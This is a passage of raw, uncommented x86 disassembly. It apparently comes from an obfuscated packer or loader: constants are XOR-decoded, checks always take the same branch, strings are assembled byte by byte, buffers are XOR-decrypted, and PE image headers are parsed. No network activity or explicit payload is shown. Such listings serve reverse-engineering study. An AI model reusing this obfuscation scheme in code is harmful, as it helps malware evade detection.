  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
